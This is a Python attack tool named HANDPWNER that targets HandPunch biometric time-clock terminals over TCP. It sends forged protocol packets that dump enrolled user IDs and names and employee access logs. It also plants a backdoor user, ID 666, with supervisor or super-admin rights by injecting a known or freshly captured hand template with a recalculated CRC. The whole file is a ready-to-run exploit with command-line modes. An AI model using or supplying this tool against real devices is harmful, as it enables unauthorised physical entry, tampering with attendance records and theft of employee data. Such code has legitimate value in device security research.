import socket
import pyfiglet
import sys
from datetime import datetime
import time, codecs, binascii, re
import crcmod.predefined
from binascii import unhexlify
import argparse
import logging

def crcCalc(payload):
    s = unhexlify(payload)
    crc16 = crcmod.predefined.Crc('xmodem')
    crc16.update(s)
    hex=crc16.hexdigest()
    hexbyte1 = hex[0] + hex[1]
    hexbyte2 = hex[2] + hex[3]
    newhex = hexbyte2 + hexbyte1
    packet='ff0a'+payload+newhex+'ff'
    return packet

# HEADER + ADDRESS   +  CMD  +   LENGHT DATA  +    DATA    +   CRC
#  (2B)      (1B)      (1B)          (1B)          (nB)        (3B)
#  ff 0a      00        XX           YY          ..zzz..     YY YY YY
#HAND TEMPLATE = 9 bytes
#ID NUMBER = 5 bytes (10 binary code digits)


def dumpUsers(host,port):
    message='ff0a00480200003f85ff'
    mySocket = socket.socket()
    mySocket.connect((host, port))
    msg = bytes.fromhex(message)
    mySocket.send(msg)
    data = mySocket.recv(1024)
    data.hex()
    logging.debug('Received from server: ' + data.hex())
    #[TODO]: Add loop here that goes through the response and parses all the UserIDs and Usernames!
    #Example of response:
    #ff0affb6001000000013376683768365757c68820500000000000000000000000000000041646d696e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000569832000000000000000000000000000000000000000000000000004a6f686e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000898960000000000000000000100000000000000000000000000000044616e69656c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000046327000000000000000000000000000000000000000000000000004672616e63697300000000000000000000000000000000000000000000000000000000000000000000000000000000000000442100000000000000000000000000000000000000000000000000436c6172610000000000000000000000000000000000000000000000000000000000000000000000000000000000000000069312000000000000000000000000000000000000000000000000005068696c69700000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    usr = data.hex()[12:]
    usr = usr[0:10]
    print('UserID: ' + usr)
    usrnm = data.hex()[42:]
    usrnm = usrnm[0:40]
    print('UserName: ' + bytearray.fromhex(usrnm).decode())
    time.sleep(1)
    mySocket.close()

def dumpLogs(host,port,howMany):
    for x in range(0,howMany):   
        try:
            socket.setdefaulttimeout(1.5)
            tcp = socket.socket()
            tcp.connect((host, port))
            tcp.send(bytes.fromhex('ff0a004d00907bff'))
            data = tcp.recv(1024)
            #Expecting something like ff 0a ff 38 12 00 08 0a 0a 0b 05 15 07 00 00 00 06 66 ff ff ff ff ff 82 ce
            data.hex()
            ts = data.hex()[12:]
            hex = ts[0:12]
            logging.debug('Original TimeStamp hex: ' + hex)
            hexbyte1 = hex[0] + hex[1]
            hexbyte2 = hex[2] + hex[3]
            hexbyte3 = hex[4] + hex[5]
            hexbyte4 = hex[6] + hex[7]
            hexbyte5 = hex[8] + hex[9]
            hexbyte6 = hex[10] + hex[11]
            print ('[!] TimeStamp: ' + str(int(hexbyte6, 16)) + '-' + str(int(hexbyte5, 16)) + '-' +  str(int(hexbyte4, 16)) + '  ' + str(int(hexbyte3, 16)) + ':' + str(int(hexbyte2, 16)) + ':' + str(int(hexbyte1, 16)))
            eID = data.hex()[26:]
            EmployeeID = eID[0:10]
            print ('[!] EmployeeID: ' + EmployeeID + '\n')
            tcp.close()
        except socket.error:
            #print("[!] No device with address: " + address)
            logging.info('[!] No device with address: ' + host)
            tcp.close()


def sendMessage(message,host,port):
    mySocket = socket.socket()
    mySocket.connect((host, port))
    msg = bytes.fromhex(message)
    mySocket.send(msg)
    data = mySocket.recv(1024)
    data.hex()
    logging.debug('Received from server: ' + data.hex())
    #print ('[!] Model Name: ' + bytearray.fromhex(data.hex()).decode())
    #print(re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", str(data)))
    time.sleep(1)
    mySocket.close()

### LBO TODO: Add handling different Handpunch Addresses respect the default 00!!!!
    
def presetBackdoor(host,port,template):
    # My Hand Template 6875748268787c6085
    # You need a similar template generated from a similar Handpunch model
    #(SendStatusCRC)
    sendMessage('ff0a00440008c1ff',host,port)
    time.sleep(1)
    #(SendReaderInfo)
    logging.info('### Enrolling new Supervisor with given hand template ###')
    sendMessage('ff0a0073000a5dff',host,port)
    time.sleep(1)
    #(HereIsUserRecord) Example my hand template: 6875748268787c6085
    #UserID 5 bytes, Template 9 bytes, Authority 1 byte, Timezone 1 byte
    #sendMessage('ff0a00371000000006666875748268787c60850500cb42ff',host,port) #Seems like the FF padding in post-frame is not needed
    forgedPacket =  '0037100000000666'+template+'0500'    
    logging.debug('[+] Final Packet to be sent: ' + crcCalc(forgedPacket).lower())
    sendMessage(crcCalc(forgedPacket),host,port)

    logging.info('### DONE! Backdoor UserID: 666 - Role: Super Admin ####')


def defaultBackdoor(host,port):
    #(SendStatusCRC)
    sendMessage('ff0a00440008c1ff',host,port)
    time.sleep(1)
    logging.info('### Stay near the handpunch for enrolling your hand! ###')

    # #(SendReaderInfo)
    # sendMessage('ff0a0073000a5dff',host,port)
    # time.sleep(1)

    #(SendUserRecord) [UserID = 5 bytes = 00 00 00 06 66]
    sendMessage('ff0a0038050000000666e72fff',host,port)
    time.sleep(1)

    #(HereIsExtendedUserRecord)
    #[UserID 5 bytes, Template 9 bytes, Authority 1 bytes, Timezone 1 bytes, PTI 12 bytes, FKMASKS 2 bytes, Name 16 bytes, Data 24 bytes, Amnesty 1 bytes, RESERVED 6 bytes]
    sendMessage('ff0a00784d0000000666000000000000000000050000000000000000000000000000006861636b65720000000000000000000000000000000000000000000000000000000000000000000000000000000000c9f1ff',host,port)
    time.sleep(1)

    #(EnrollUser)
    logging.info('### PLACE YOUR HAND! ###') #Actually is not needed since we already have a template hardcoded of my hand.
    sendMessage('ff0a0049020200e995ff',host,port)
    time.sleep(1)

    #(HereIsKeypadData)
    sendMessage('ff0a0062020203db8cff',host,port)
    time.sleep(10)

    #(SendTemplate)
    message = 'ff0a004b0036d1ff'
    time.sleep(1)
    mySocket = socket.socket()
    mySocket.connect((host, port))
    msg = bytes.fromhex(message)
    mySocket.send(msg)
    data = mySocket.recv(1024)
    data.hex()
    logging.debug(data.hex())
    response = data.hex()[14:]
    handTemplate = response[0:18]
    logging.info('### YOUR HAND TEMPLATE is: ' + handTemplate +' ###')
    time.sleep(1)
    mySocket.close()
    time.sleep(1)
    # This will reply with the acquired Template. In case, you can parse it and use in the next request.
    #[HereIsTemplateVector] Score 2 bytes, Template 9 bytes
    #REPLY: ff 0a ff 37 0b 02 00 68 75 74 82 68 78 7c 60 85 42 7b    
    #        HEADER    +    CMD   +   SCORE  +            HAND TEMPLATE           +   CRC      
    #       ff 0a ff        37 0b     02 00        68 75 74 82 68 78 7c 60 85        42 7b

    forgedPacket =  '0037100000000666'+handTemplate+'0500'

    #(HereIsUserRecord)
    #UserID 5 bytes, Template 9 bytes, Authority 1 byte, Timezone 1     
    logging.debug('Final Packet to be sent: ' + crcCalc(forgedPacket).lower())
    sendMessage(crcCalc(forgedPacket),host,port)
    logging.info('### DONE! Backdoor UserID: 666 - Role: Supervisor ####')



if __name__ == '__main__':
    print(pyfiglet.figlet_format("HANDPWNER", font = "smkeyboard" ))
    print('Copyright© 2021 - Luca Bongiorni - www.whid.ninja\n\n')
    socket.setdefaulttimeout(30)
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', type=str, required=True, help="Host IP")
    parser.add_argument('-p', type=int, default=3001, help="Port (default 3001)")
    parser.add_argument('-t', type=str, default='6875748268787c6085', help="Hand 9-bytes Hex Template for Known-Mode. Example: 1A2B3C4D5E6F778899")
    parser.add_argument('-m', '--mode', required=True, dest='mode', choices=['default', 'known', 'dumplogs', 'dumpusers'], help="Select Mode of Backdooring. DEFAULT-MODE: you're gonna enroll a new hand on the handpunch. KNOWN-MODE: you have to provide a pre-existing hand template")
    parser.add_argument("-n", type=int, default=20, help="Quantity of logs to dump. Default: 20")
    parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
    args = parser.parse_args()

    host=args.i
    port=args.p
    template=args.t
    mode = args.mode
    quantity = args.n


    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    if mode == 'default':
        defaultBackdoor(host,port)
    elif mode == 'known':
        presetBackdoor(host,port,template)
    elif mode == 'dumplogs':
        dumpLogs(host,port,quantity)
    elif mode == 'dumpusers':
        dumpUsers(host,port)

